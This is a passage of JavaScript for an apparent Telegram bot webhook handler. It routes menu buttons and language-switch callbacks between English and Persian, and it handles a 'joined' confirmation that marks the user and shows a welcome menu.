          console.error('Error in Accounts button:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === translations[lang].menu.address) {
        try {
          await bot.telegram.sendMessage(chatId, translations[lang].addressMessage, getMenuKeyboard(lang));
        } catch (error) {
          console.error('Error in Address button:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === translations[lang].menu.changeLanguage) {
        try {
          await bot.telegram.sendMessage(chatId, translations[lang].chooseLanguage, {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: translations[lang].english, callback_data: 'lang_en_menu' },
                  { text: translations[lang].persian, callback_data: 'lang_fa_menu' },
                ],
              ],
            },
          });
        } catch (error) {
          console.error('Error in Change Language button:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }
    }

    if (update.callback_query) {
      const callbackQuery = update.callback_query;
      const callbackData = callbackQuery.data;
      const callbackQueryId = callbackQuery.id;

      if (callbackData === 'lang_en') {
        try {
          botUser.language = 'en';
          await botUser.save();

          await bot.telegram.answerCbQuery(callbackQueryId, lang === 'en' ? 'Language set to English' : 'زبان به انگلیسی تنظیم شد');
          const inlineKeyboard = [];
          inlineKeyboard.push([{ text: translations['en'].joinChannelMain, url: defaultUrl }]);
          if (customUrl) {
            inlineKeyboard.push([{ text: translations['en'].joinChannelCustom, url: customUrl }]);
          }
          inlineKeyboard.push([{ text: translations['en'].joined, callback_data: 'joined' }]);

          await bot.telegram.editMessageText(
            chatId,
            messageId,
            null,
            translations['en'].joinMessage,
            {
              reply_markup: {
                inline_keyboard: inlineKeyboard,
              },
            }
          );
          botUser.userStep = 'none';
          await botUser.save();
        } catch (error) {
          console.error('Error in "lang_en" callback:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (callbackData === 'lang_fa') {
        try {
          botUser.language = 'fa';
          await botUser.save();

          await bot.telegram.answerCbQuery(callbackQueryId, lang === 'en' ? 'Language set to Persian' : 'زبان به فارسی تنظیم شد');
          const inlineKeyboard = [];
          inlineKeyboard.push([{ text: translations['fa'].joinChannelMain, url: defaultUrl }]);
          if (customUrl) {
            inlineKeyboard.push([{ text: translations['fa'].joinChannelCustom, url: customUrl }]);
          }
          inlineKeyboard.push([{ text: translations['fa'].joined, callback_data: 'joined' }]);

          await bot.telegram.editMessageText(
            chatId,
            messageId,
            null,
            translations['fa'].joinMessage,
            {
              reply_markup: {
                inline_keyboard: inlineKeyboard,
              },
            }
          );
          botUser.userStep = 'none';
          await botUser.save();
        } catch (error) {
          console.error('Error in "lang_fa" callback:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (callbackData === 'lang_en_menu') {
        try {
          botUser.language = 'en';
          await botUser.save();

          await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
          const username = botUser.username || 'User';
          const welcomeMessage = translations['en'].welcome(username);
          await bot.telegram.editMessageText(
            chatId,
            messageId,
            null,
            welcomeMessage,
            getMenuKeyboard('en')
          );
        } catch (error) {
          console.error('Error in "lang_en_menu" callback:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (callbackData === 'lang_fa_menu') {
        try {
          botUser.language = 'fa';
          await botUser.save();

          await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
          const username = botUser.username || 'User';
          const welcomeMessage = translations['fa'].welcome(username);
          await bot.telegram.editMessageText(
            chatId,
            messageId,
            null,
            welcomeMessage,
            getMenuKeyboard('fa')
          );
        } catch (error) {
          console.error('Error in "lang_fa_menu" callback:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (callbackData === 'joined') {
        try {
          botUser.hasJoined = true;
          await botUser.save();

          const username = botUser.username || 'User';
          const welcomeMessage = translations[lang].welcome(username);
          await bot.telegram.answerCbQuery(callbackQueryId, translations[lang].thankYou);
          await bot.telegram.deleteMessage(chatId, messageId);
          await bot.telegram.sendMessage(chatId, welcomeMessage, getMenuKeyboard(lang));
        } catch (error) {
          console.error('Error in "joined" callback:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }
    }

    res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Error in created.js:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
};